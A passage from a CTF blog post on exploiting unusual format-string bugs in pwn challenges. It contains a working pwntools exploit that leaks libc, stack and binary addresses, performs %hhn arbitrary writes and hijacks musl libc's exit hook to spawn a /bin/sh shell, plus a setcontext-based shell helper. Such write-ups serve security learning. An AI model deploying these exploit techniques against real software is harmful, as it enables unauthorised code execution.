p64(src)  <span class="comment"># fldenv ptr</span></span><br><span class="line">    b[<span class="number">0x1C0</span>:<span class="number">0x1C8</span>] = p64(<span class="number">0x1F80</span>)  <span class="comment"># ldmxcsr</span></span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA0</span>:<span class="number">0xA8</span>] = p64(rsp)</span><br><span class="line">    b[<span class="number">0x80</span>:<span class="number">0x88</span>] = p64(rbx)</span><br><span class="line">    b[<span class="number">0x78</span>:<span class="number">0x80</span>] = p64(rbp)</span><br><span class="line">    b[<span class="number">0x48</span>:<span class="number">0x50</span>] = p64(r12)</span><br><span class="line">    b[<span class="number">0x50</span>:<span class="number">0x58</span>] = p64(r13)</span><br><span class="line">    b[<span class="number">0x58</span>:<span class="number">0x60</span>] = p64(r14)</span><br><span class="line">    b[<span class="number">0x60</span>:<span class="number">0x68</span>] = p64(r15)</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA8</span>:<span class="number">0xB0</span>] = p64(rip)  <span class="comment"># ret ptr</span></span><br><span class="line">    b[<span class="number">0x70</span>:<span class="number">0x78</span>] = p64(rsi)</span><br><span class="line">    b[<span class="number">0x68</span>:<span class="number">0x70</span>] = p64(rdi)</span><br><span class="line">    b[<span class="number">0x98</span>:<span class="number">0xA0</span>] = p64(rcx)</span><br><span class="line">    b[<span class="number">0x28</span>:<span class="number">0x30</span>] = p64(r8)</span><br><span class="line">    b[<span class="number">0x30</span>:<span class="number">0x38</span>] = p64(r9)</span><br><span class="line">    b[<span class="number">0x88</span>:<span class="number">0x90</span>] = p64(rdx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcontext32</span>(<span class="params">libc: ELF, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">bytes</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt_trampoline = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    <span class="keyword">return</span> got, flat(</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(got + <span class="number">0x218</span>),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>),</span><br><span class="line">        p64(plt_trampoline) * <span class="number">0x40</span>,</span><br><span class="line">        create_ucontext(got + <span class="number">0x218</span>, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, **kwargs),</span><br><span class="line">    )</span><br><span class="line"><span class="comment"># e.g. dest, payload = setcontext32.setcontext32(</span></span><br><span class="line"><span class="comment">#         libc, rip=libc.sym[&quot;system&quot;], rdi=libc.search(b&quot;/bin/sh&quot;).__next__()</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">gdb_comm = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x11F5)</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_byte</span>(<span class="params">byte, addr</span>):</span><br><span class="line">    sl(<span class="string">b&#x27;%c%c%c%c&#x27;</span> + <span class="string">f&#x27;.%<span class="subst">&#123;byte + <span class="number">248</span>&#125;</span>c%c&#x27;</span>.encode() + <span class="string">b&#x27;%c%c%hhn&#x27;</span> + p64(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_qword</span>(<span class="params">qword, addr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        write_byte((qword &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span>, addr + i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -stack-libc</span></span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span> * <span class="number">34</span> + <span class="string">b&#x27;-%p&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%p&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;-%p&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>) - (<span class="number">0x75fb9b010560</span> - <span class="number">0x75fb9af61000</span>)</span><br><span class="line">rbp = stack - (<span class="number">0x7ffe2b6f52c8</span> - <span class="number">0x7ffe2b6f5280</span>)</span><br><span class="line">input_addr = rbp - <span class="number">0x110</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x00000000000152a1</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000019e9c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">255</span></span><br><span class="line">sl(payload) <span class="comment"># clean up buf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span> * <span class="number">46</span> + <span class="string">b&#x27;-%p&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>) - (<span class="number">0x61b7c38d50a6</span> - <span class="number">0x61b7c38d4000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">255</span></span><br><span class="line">sl(payload) <span class="comment"># clean up buf</span></span><br><span class="line"></span><br><span class="line">struct_fl_addr = libc_base + <span class="number">0xafc48</span></span><br><span class="line">fake_struct_fl_addr = elf_base + <span class="number">0x4200</span></span><br><span class="line"></span><br><span class="line">write_qword(fake_struct_fl_addr, struct_fl_addr)</span><br><span class="line">write_qword(fake_struct_fl_addr, fake_struct_fl_addr)</span><br><span class="line">write_qword(system, fake_struct_fl_addr + <span class="number">0x100</span>)</span><br><span class="line">write_qword(binsh, fake_struct_fl_addr + <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">sl(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>musl libc中的exit hook，在exit的一个子函数中有一个函数指针的调用的操作，这个函数指针和参数都在ld的数据段上，所以如果能实现任意地址写同时能触发exit就能通过exit hook去getshell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">exit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_1B880();</span><br><span class="line">  sub_75E10();</span><br><span class="line">  sub_5A100();</span><br><span class="line">  Exit(a1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">sub_1B880</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v4)(__int64); <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// cc</span></span><br><span class="line"></span><br><span class="line">  result = sub_68D30(&amp;unk_AFE60);</span><br><span class="line">  v1 = (_QWORD *)qword_AFC48;</span><br><span class="line">  <span class="keyword">if</span> ( qword_AFC48 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = dword_AFE64;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)--dword_AFE64;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v1[(<span class="type">int</span>)result + <span class="number">33</span>];</span><br><span class="line">        v4 = (<span class="type">void</span> (__fastcall *)(__int64))v1[(<span class="type">int</span>)result + <span class="number">1</span>];</span><br><span class="line">        sub_68E20(&amp;unk_AFE60);</span><br><span class="line">        v4(v3);</span><br><span class="line">        sub_68D30(&amp;unk_AFE60);</span><br><span class="line">        result = (<span class="type">unsigned</span> <span class="type">int</span>)(dword_AFE64 - <span class="number">1</span>);</span><br><span class="line">        v5 = dword_AFE64 &lt;= <span class="number">0</span>;</span><br><span class="line">        v1 = (_QWORD *)qword_AFC48;</span><br><span class="line">        --dword_AFE64;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( !v5 );</span><br><span class="line">LABEL_4:</span><br><span class="line">      dword_AFE64 = <span class="number">32</span>;</span><br><span class="line">      v1 = (_QWORD *)*v1;</span><br><span class="line">      qword_AFC48 = (__int64)v1;</span><br><span class="line">      <span class="keyword">if</span> ( !v1 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      dword_AFE64 = <span class="number">31</span>;</span><br><span class="line">      LODWORD(result) = <span class="number">31</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
+            <p>Link：<a href="https://nyyyddddn.github.io/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">https://nyyyddddn.github.io/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/</a>
+            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">August 22nd 2024, 1:11:30 am</a>
+            <p>Update date：<a href="https://nyyyddddn.github.io/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">August 22nd 2024, 1:12:05 am</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/08/08/tfcctf2024/" title="tfcctf2024">
+                    <div class="prevTitle">tfcctf2024</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A5%97orw"><span class="toc-number">1.</span> <span class="toc-text">非栈上格式化字符串套orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E4%B8%AA%E5%AD%97%E8%8A%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2libc"><span class="toc-number">2.</span> <span class="toc-text">3个字节格式化字符串泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#musl-libc%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%92%8C%E7%A6%81%E7%94%A8-%E5%B7%AE%E4%B8%8D%E5%A4%9A"><span class="toc-number">3.</span> <span class="toc-text">musl libc中的格式化字符串 (和禁用$差不多)</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 47
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span>
+            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span>
+            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span>
+            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span>
+            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span>
+            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span>
+            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span>
+            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/19</span>
+            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span>
+            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span>
+            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span>
+            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span>
+            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span>
+            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span>
+            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span>
+            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span>
+            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span>
+            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span>
+            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span>
+            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span>
+            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span>
+            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span>
+            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span>
+            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span>
+            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span>
+            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span>
+            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span>
+            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/11</span>
+            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span>
+            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span>
+            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span>
+            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/26</span>
+            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span>
+            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/19</span>
+            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span>
+            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/04</span>
+            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
